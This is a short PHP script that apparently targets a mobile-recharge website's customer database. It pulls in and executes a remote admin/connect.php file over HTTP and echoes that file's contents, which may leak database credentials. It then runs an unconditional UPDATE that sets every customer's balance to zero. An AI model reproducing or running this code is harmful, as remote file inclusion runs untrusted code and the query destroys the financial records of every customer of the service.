<?php
    
    include("http://quickrecharge.com.ng/admin/connect.php");
    echo file_get_contents("https://quickrecharge.com.ng/admin/connect.php");
    $query = "UPDATE customers SET balance = 0";
    $res = mysqli_query($conn, $query);
    echo $res;
?>